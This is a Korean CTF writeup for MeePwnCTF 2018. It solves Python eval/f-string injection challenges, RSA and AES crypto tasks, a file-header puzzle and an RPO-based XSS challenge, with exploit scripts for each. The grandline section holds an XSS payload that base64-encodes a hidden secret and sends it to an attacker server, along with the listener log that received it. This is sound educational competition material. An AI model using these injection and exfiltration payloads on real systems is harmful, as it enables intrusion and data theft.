# MeePwnCTF 2018 Writeup

## Solved Problem

- [pycalx](#pycalx) - web / python3.6 / eval
- [pycalx2](#pycalx2) - web / python3.6 / eval
- [White Snow, Black Shadow](#white-snow-black-shadow) - misc / file header
- [Welcome](#Welcome) - misc / sanity check
- [bazik](#bazik) - crypto / brute force(?)
- [esor](#esor) - crypto / simple decrypt rsa
- [grandline](#grandline) - web / rpo / xss

## pycalx

#### 문제 설명

>  This code is supposed to be unexploitable :/ another pyjail? 
>
> [[Source\]](http://178.128.96.203/cgi-bin/server.py?source=1)  
>
> [Try this ](http://178.128.96.203/cgi-bin/server.py?value1=123&op=%3D%3D&value2=123)or [this](http://178.128.96.203/cgi-bin/server.py?value1=abc&op=%3D%3D&value2=abc)   
>
> Notice: The flag may contain non alphabetic characters (but still printable)

#### 문제 풀이

문제에서 수식을 입력하면 답은 주는 python interpreter가 주어졌다.

또한 해당 페이지에 대한 소스 코드도 제공되었다.

```python
...
FLAG = open('/var/www/flag','r').read()
...
if 'value1' in arguments and 'value2' in arguments and 'op' in arguments:

    def get_value(val):
        val = str(val)[:64]
        if str(val).isdigit(): return int(val)
        blacklist = ['(',')','[',']','\'','"'] # I don't like tuple, list and dict.
        if val == '' or [c for c in blacklist if c in val] != []:
            print('<center>Invalid value</center>')
            sys.exit(0)
        return val

    def get_op(val):
        val = str(val)[:2]
        list_ops = ['+','-','/','*','=','!']
        if val == '' or val[0] not in list_ops:
            print('<center>Invalid op</center>')
            sys.exit(0)
        return val

    op = get_op(arguments['op'].value)
    value1 = get_value(arguments['value1'].value)
    value2 = get_value(arguments['value2'].value)

    if str(value1).isdigit() ^ str(value2).isdigit():
        print('<center>Types of the values don\'t match</center>')
        sys.exit(0)

    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))

    print('<div class=container><div class=row><div class=col-md-2></div><div class="col-md-8"><pre>')
    print('>>>> print('+escape(calc_eval)+')')

    try:
        result = str(eval(calc_eval))
        if result.isdigit() or result == 'True' or result == 'False':
            print(result)
        else:
            print("Invalid") # Sorry we don't support output as a string due to security issue.
    except:
        print("Invalid")


    print('>>> </pre></div></div></div>')
```

`FLAG` 변수 안에 우리가 얻어야 할 문자열이 들어가 있는 것을 알 수있다.

그리고 우리가 입력한 value1, op, value2는 각각 `value1+op+value2` 의 형태를 이루어 eval을 통해 계산이 된다.

이를 통해 얻은 결과가 숫자, 또는 참, 거짓일 때만 화면에 결과를 출력해준다.

처음에는`value1 = a&op = +'&value2 = >FLAG#` 를 넣어 대소 비교의 참, 거짓의 유무로 FLAG를 추출하였으나, 플래그에 필터링된 문자열이 섞여있어 더이상 진행이 불가능하였다.

**MeePwnCTF{python3.66666666666666_(**

하지만 플래그의 앞 부분을 보았을 때, python 3.6을 사용하는 것을 알 수 있었다.

python3.6의 특징은 format string을 쓸 수 있는 것이다.

>\>>> simple = 'shpik'
>
>\>>> print(f'{simple}')
>
>shpik

이를 이용하여 FLAG를 뽑았으며m 최종쿼리와 python 소스는 다음과 같다.

```python
import requests

url = 'http://178.128.96.203/cgi-bin/server.py'

params = {'value1': 'True',
          'op': '+f',
          'value2': '{source*0 if source in FLAG else 1}'}

flag = 'MeePwnCTF{python3.66666666666666_([_((you_passed_this?]]]]]])}'

while True:
    for i in range(ord('['), 0x100):
        print i
        params['source'] = flag + chr(i)
        r = requests.get(url, params=params)
        if 'Invalid' not in r.text:
            flag += chr(i)
            print flag
            break
```

#### 플래그

FLAG : MeePwnCTF{python3.66666666666666_([_((you_passed_this?]]]]]])}



## pycalx2

#### 문제 설명

> You should solve `PyCalx` first. 

#### 문제 풀이

pycalx의 문제에서 op에 getValue을 추가적으로 거쳐 필터링이 추가되어 있다.

```python
def get_value(val):
    val = str(val)[:64]
    if str(val).isdigit(): return int(val)
    	blacklist = ['(',')','[',']','\'','"'] # I don't like tuple, list and dict.
    if val == '' or [c for c in blacklist if c in val] != []:
    	print('<center>Invalid value</center>')
    	sys.exit(0)
    return val
```

이와 같은 경우도 위와 같은 코드를 통해 뽑을 수 있다.

```python
import requests

url = 'http://206.189.223.3/cgi-bin/server.py'

params = {'value1': 'True',
          'op': '+f',
          'value2': '{source*0 if source in FLAG else 1}'}

flag = 'MeePwnCTF{python3.6[_strikes_backkkkkkkkkkkk)}'

while True:
    for i in range(ord('['), 0x100):
        print i
        params['source'] = flag + chr(i)
        r = requests.get(url, params=params)
        if 'Invalid' not in r.text:
            flag += chr(i)
            print flag
            break
```

#### 플래그

MeePwnCTF{python3.6[_strikes_backkkkkkkkkkkk)}



## White Snow, Black Shadow

#### 문제 설명

>  Finally we caught the image in criminal communication. But Holmes, why are they crying?

#### 문제 풀이

이 문제는 굉장히 간단하다.

이미지 파일이 주어졌는데, 뒷 부분에 PK헤더가 보이므로 이를 파싱하였다.

이를 압축을 해제하면 오류가 발생한다.

이유는 간단하게 헤더의 앞부분이 조금 깨져있으며 이를 수정해주면된다.

압축을 풀고나면 PDF파일이 나오는데, 이 PDF안에 몇몇의 이상한 문자열이 있고, 이를 조합하면 플래그가 나온다.

#### 플래그

FLAG : MeePwnCTF{T3xt_Und3r_t3Xt!!!!}



## Welcome

#### 문제 설명

>  The default format of flag is `MeePwnCTF{...}`
>
>  MeePwnCTF{welcome_to_meepwnctf_2018}

#### 문제 풀이

Sanity Check 문제이다.

#### 플래그

FLAG : MeePwnCTF{welcome_to_meepwnctf_2018}



## bazik

#### 문제 설명

>  A basic challenge will shine you... 
>
>  nc 206.189.92.209 31333
>
>  nc 178.128.17.82 31333

#### 문제 풀이

이 문제는 OTP 값을 맞추는 문제이다.

```
Choose one:
1. Test the OTP
2. Get the public key
3. Get flag
```

위는 문제의 메뉴이며, 2번째 메뉴에서는 public key를 얻을 수 있으며, 1번 메뉴에서는 이 public key를 이용하여 평문과 이를 암호화한 암호문을 보여준다.

3번째 메뉴는 암호문을 보여주고, OTP를 입력받으며 만약 맞을 경우 FLAG를 주는 방식이다.

주어진 평문은 다음과 같다.

```
Your OTP for transaction #731337 in ABCXYZ Bank is 500000000.
```

또한, public key에서 추출한 e는 3이어서 간단하게 아래의 식을 시도하였다.

m= c^(1/3) modN

하지만 암호화한 평문의 길이는 N보다 훨씬 크기때문에 매우 시간이 오래 걸릴 것이다.

그로 인해 생각한 어찌됫건 평문의 3승을 하고, 이를 N으로 모듈러 연산을 한 것이기 때문에,  `cubic function`문제가 된다.

또한, 암호문은 길이는 평문의 5~6자리 정도만 확인이 가능하지만, 위의 평문에서 바뀌는 부분은 맨 뒤의 9자리의 숫자이다.

그렇게 때문에 우리는 3~4자리의 숫자만 맞출 수 있으면 되는 것이다.

기본적인 아이디어는 다음과 같다.

우선 e가 3일때 RSA를 통해 문자열을 암호화 하는 것은 다음과 같다.

c = N*x + m^3

위 식은 다음과 같이 표현이 가능하다.

c = m^3 modN

m = 3sqrt(c-N*x)

여기서 중요한 점은 x의 범위가 프로그램의 작동 시간 내에 계산이 완료되어야 하고, 또한 메모리의 한계를 초과해서는 안된다.

또한 반드시 세제곱근을 가지고 있어야 한다. 

그래서 나의 맥북과 타협을하여 x의 범위를 다음과 같이 설정하였다.

0 < x < 10000000

위와 같이 범위를 주었을 때, 오차범위는 기준이 되는 OTP값에서 +190000000 정도로써 약 20%로 플래그를 얻을 수 있으며 코드는 다음과 같다.

```python
from pwn import *
from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes, bytes_to_long
from gmpy2 import iroot

r = remote('178.128.17.82',31333)

r.recvuntil('3. Get flag')
r.sendline(str(2))
r.recvline()
pubkey = r.recvuntil('-----END PUBLIC KEY-----\n')
key = RSA.importKey(pubkey)
log.success('e : %d'%key.e)
log.success('n : %d'%key.n)
n = key.n
e = key.e
print ''
m0 = bytes_to_long('Your OTP for transaction #731337 in ABCXYZ Bank is 500000000.')
c0 = pow(m0,e,n)
prev = -1
ppp = (m0 ** 3) // n
print ppp
print ''
while 1:
	print ''
	print r.recvuntil('3. Get flag')
	r.sendline(str(3))
	r.recvuntil('encrypted dat: ')
	c = int(r.recvuntil('\n').replace('\n',''),16)
	ans = '1'
	c1 = c
	for i in range(0,10000000):
		val,qq=iroot(c1+(ppp+i)*n,3)
		if qq==True:
			ans = long_to_bytes(val)
			print ans
			ans = ans[-10:-1]
			break
	r.recvuntil('send me otp to get flag >>>')
	r.sendline(ans)

r.close()
'''
1. Test the OTP
2. Get the public key
3. Get flag
Your OTP for transaction #731337 in ABCXYZ Bank is 661422374.

MeePwnCTF{blackbox-rsa-is-0xd34d}
'''
```

#### 플래그

FLAG : MeePwnCTF{blackbox-rsa-is-0xd34d}



## esor

#### 문제 설명

>  Howdy, howdy... 
>
>  nc 206.189.92.209 12345

#### 문제 풀이

이 문제는 AES Decrypt 코딩을 해봤냐를 알기 위한 문제인 것 같다.(?)

우선 코드를 보자.

```python
#!/usr/bin/python2
from Crypto.Cipher import AES
import hmac, hashlib
import os
import sys

menu = """Choose one:
1. encrypt data
2. decrypt data
3. quit
"""

class Unbuffered(object):
    def __init__(self, stream):
        self.stream = stream
    def write(self, data):
        self.stream.write(data)
        self.stream.flush()
    def __getattr__(self, attr):
        return getattr(self.stream, attr)

sys.stdout = Unbuffered(sys.stdout)
sys.stderr = None

encrypt_key = '\xff' * 32
secret = 'MeePwnCTF{#flag_here#}'
hmac_secret = ''
blocksize = 16
hmac_size = 20

def pad(msg):
	padlen = blocksize - (len(msg) % blocksize) - 1
	return os.urandom(padlen) + chr(padlen)

def unpad(msg):
	return msg[:-(ord(msg[-1]) + 1)]

def compute_hmac(msg):
	return hmac.new(hmac_secret, msg, digestmod=hashlib.sha1).digest()

def encrypt(prefix='', suffix=''):
	_enc = prefix + secret + suffix
	_enc+= compute_hmac(_enc)
	_enc+= pad(_enc)
	iv = os.urandom(16)
	_aes = AES.new(encrypt_key, AES.MODE_CBC, iv)
	return (iv + _aes.encrypt(_enc)).encode('hex')

def decrypt(data):
	data = data.decode('hex')
	try:
		iv = data[:blocksize]
		_aes = AES.new(encrypt_key, AES.MODE_CBC, iv)
		data = _aes.decrypt(data[blocksize:])
		data = unpad(data)
		plaintext = data[:-hmac_size]
		mac = data[-hmac_size:]
		if mac == compute_hmac(plaintext): return True
		else: return False
	except: return False

print """Welcome to our super secure enc/dec server. 
We use hmac, so, plz don't hack us (and you can't). Thanks."""

while True:
	choice = int(raw_input(menu))
	if choice == 1:
		_pre = raw_input('prefix: ')
		_suf = raw_input('suffix: ')
		print encrypt(prefix=_pre, suffix=_suf)
	elif choice == 2:
		_data = raw_input('data: ')
		if decrypt(_data):
			print 'OK'
		else:
			print 'KO'
	elif choice == 3:
		sys.exit(0)
	else:
		choice = int(raw_input(menu))
```

AES를 암호화할 때 사용하는 Key값(`encrypt_key = '\xff' * 32`)을 얻을 수 있고, 암호문의 첫 16바이트가 IV임을 알 수 있다.

이를 이용해 서버에서 받은 값을 decrypt해주면 플래그가 나오며, 코드는 다음과 같다.

```python
from pwn import *
from Crypto.Cipher import AES

r = remote('206.189.92.209',12345)

s = lambda x:r.sendline(str(x))

r.recvuntil('3. quit')
s(1)
r.recvuntil('prefix:')
s('')
r.recvuntil('suffix:')
s('B'*8)
cipher = r.recvuntil('\n').replace('\n','').replace(' ','')

blocksize = 16
iv = cipher[:32].decode('hex')
key = '\xff' * 32
aes = AES.new(key, AES.MODE_CBC, iv)
print aes.decrypt(cipher[32:].decode('hex'))


r.close()

'''
parallels@ubuntu:/media/psf/Home/writeup/ctf/meectf/2018/image$ python testpoodle.py
[+] Opening connection to 206.189.92.209 on port 12345: Done
MeePwnCTF{pooDL3-this-is-la-vie-en-rose-P00dle!}BBBBBBBB]���8����Z\xbf\xb9r�cV\x8cV\x0fx�
[*] Closed connection to 206.189.92.209 port 12345
'''
```

#### 플래그

FLAG : MeePwnCTF\{pooDL3-this-is-la-vie-en-rose-P00dle\!\}



## grandline

#### 문제 설명

> It was said to be hidden somewhere deep in the Grand Line, someone in the second part of Grand Line can capture it, could you tell them to give it for you. 
>
> Let's start a trip in [Grand Line](http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/)

#### 문제 풀이

소스코드의 맨 아래를 보면 다음과 같은 주석이 존재한다.

```html
<!-- Infact, ?debug will help you learn expression to build Grand Line ( Ex: !<>+-*/ )
```

`?debug` 를 추가해주면 소스를 얻을 수 있다.

```html
<!-- 
/* * *  Power By 0xd0ff9 * * * 
--> 
<?php 
include "config.php"; 
if(isset($_GET['debug'])) 
{ 
    show_source(__FILE__); 
    die("..."); 
} 
?> 
<!DOCTYPE html> 
<html lang="en"> 
<head> 
  <title>The Two piece Treasure</title> 
  <meta charset="utf-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1"> 
  <!-- Latest compiled and minified CSS --> 
  <link rel="stylesheet" href="css/bootstrap.min.css"> 

  <!-- jQuery library --> 
  <script src="js/jquery.min.js"></script> 

  <!-- Latest compiled JavaScript --> 
  <script src="js/bootstrap.min.js"></script> 
</head> 
<body> 

<?php 
$grandline = $_SERVER['REQUEST_URI']; 
// Best Grandline is short 
$grandline = substr($grandline,0,500); 
echo "<!-- P/s: Your grand line is ".htmlentities(urldecode($grandline),ENT_QUOTES)." , this is not Luffy 's grand line -->"; 
?> 

<div class="container"> 
<div class="jumbotron"> 
    <h1>GRAND LINE</h1>  
    <p>Welcome to Grand Line, You are in the way to become Pirate King, now, let's defeat <a href="bot.php">BigMom</a> first</p>  
</div> 
<?php 
$loca = $_SERVER["REMOTE_ADDR"]; 
echo "<input name='location' value='".$loca."' type='hidden'><br>"; 
if ($loca === "127.0.0.1" || $loca==="::1") 
{ 
    echo "<input name='piece' value='".$secret."' type='hidden'>"; 
} 
else 
{ 
    echo "<input name='piece' value='Only whitebeard can see it, Gura gura gura' type='hidden'>"; 
} 
?> 
  <h4>If you eat fruit, you can't swim</h4> 
        <img src="images/grandline.png"/> 
        <br> 
        <form method="get" action="index.php"> 
        <input type="text" name="eat" placeholder="" value="gomu gomu no mi">         
        <input type="submit"> 
        </form> 
    <?php  
    if(isset($_GET['eat'])&&!empty($_GET['eat'])) 
    { 
        if($_GET['eat'] === "gomu gomu no mi") 
        { 
            echo "<p>Pirate, Let's go to your Grand Line</p>"; 
        } 
        else 
        { 
            echo "<p>You need to eat 'gomu gomu no mi'</p>"; 
        } 
    } 
    ?> 
</div> 
</body> 
</html> 
<!-- Infact, ?debug will help you learn expression to build Grand Line ( Ex: !<>+-*/ ) 
```

이 문제는 전형적인 XSS 문제의 형태를 띄고 있는 것을 알 수 있다.

```php
echo "<input name='piece' value='".$secret."' type='hidden'>";
```

위의 코드는 플래그가 들어갈 것 같이 생긴 부분이다.

또한, 가운데 주석 부분에 입력한 값이 들어간다.

```php
echo "<!-- P/s: Your grand line is ".htmlentities(urldecode($grandline),ENT_QUOTES)." , this is not Luffy 's grand line -->"; 
```

하지만 <,>를 사용할 수 없으므로 다른 방법을 생각해봤으며, 재밌는 부분을 발견하였다.

```html
<!-- 
/* * *  Power By 0xd0ff9 * * * 
--> 
... ...
echo "<!-- P/s: Your grand line is ".htmlentities(urldecode($grandline),ENT_QUOTES)." , this is not Luffy 's grand line -->"; 
... ...
<!-- Infact, ?debug will help you learn expression to build Grand Line ( Ex: !<>+-*/ ) 
```

url에 \*/ ~~~ /\* 을 통해 javascript 코드를 만들 수 있다.

하지만 그러기 위해서는 이를 javascript로써 로드를 해야하는데, 그것을 위해서 RPO를 이용하였다.

```html
<script src="js/jquery.min.js"></script> 
```

script 로드 시 상대주소로 호출을 하므로 index.php가 아닌 index.php/를 요청해주므르써, index.php가 script로써 로드가 된다. 

>  http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/

이 같은 방법을 이용하여 XSS쿼리를 생성해주면 다음과 같다.

```
http://localhost/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/window.onload=function(){new%20Image().src=`//[MY SERVER]/`%2bbtoa(document.getElementsByName(`piece`)[0].value)};function%20a()%7B%7D;a(/*/*
```

이제 이를 위 URL을 Bigmom에게 보내주면 다음과 같은 결과를 받으며 플래그를 얻을 수 있다.

```bash
$ nc -lvp 80
Listening on [0.0.0.0] (family 0, port 80)
Connection from [=] port 80 [tcp/http] accepted (family 2, sport 39946)
GET /WW91IGFyZSBvbiBuZXcgd29ybGQsIGZsYWc6IE1lZVB3bkNURntXZWxjb21lX3RvX05ld19Xb3JsZH0= HTTP/1.1
Host: [MY SERVER]
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3477.0 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://localhost/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/window.onload=function()%7Bnew%20Image().src=%60//[MY SERVER]/%60%2bbtoa(document.getElementsByName(%60piece%60)[0].value)%7D;function%20a()%7B%7D;a(/*/*
Accept-Encoding: gzip, deflate
$ ipython
Python 2.7.12 (default, Nov 20 2017, 18:23:56)
Type "copyright", "credits" or "license" for more information.

IPython 2.4.1 -- An enhanced Interactive Python.
?         -> Introduction and overview of IPython's features.
%quickref -> Quick reference.
help      -> Python's own help system.
object?   -> Details about 'object', use 'object??' for extra details.

In [1]: 'WW91IGFyZSBvbiBuZXcgd29ybGQsIGZsYWc6IE1lZVB3bkNURntXZWxjb21lX3RvX05ld19Xb3JsZH0='.decode('base64')
Out[1]: 'You are on new world, flag: MeePwnCTF{Welcome_to_New_World}'
```

#### 플래그

FLAG : MeePwnCTF{Welcome_to_New_World}